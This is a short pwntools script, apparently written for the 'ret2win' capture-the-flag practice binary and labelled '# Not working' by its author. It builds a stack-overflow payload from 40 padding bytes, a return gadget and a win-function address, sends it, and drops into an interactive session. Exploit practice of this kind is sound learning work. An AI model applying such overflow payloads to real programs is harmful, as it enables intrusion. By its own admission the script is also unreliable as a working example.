# Not working
from pwn import *

e = ELF('./ret2win')
p = e.process()

print(p.recv().decode())

raw_input('attach gdb')

padding = b'A' * 40
address = p64(0x400811)
other_ret = p64(0x400830)

payload = padding + other_ret + address

p.sendline(payload)

# print(p.recvuntil("Here's your flag:").decode())
# flag = p.recvline().decode()
# success(flag)

p.interactive()
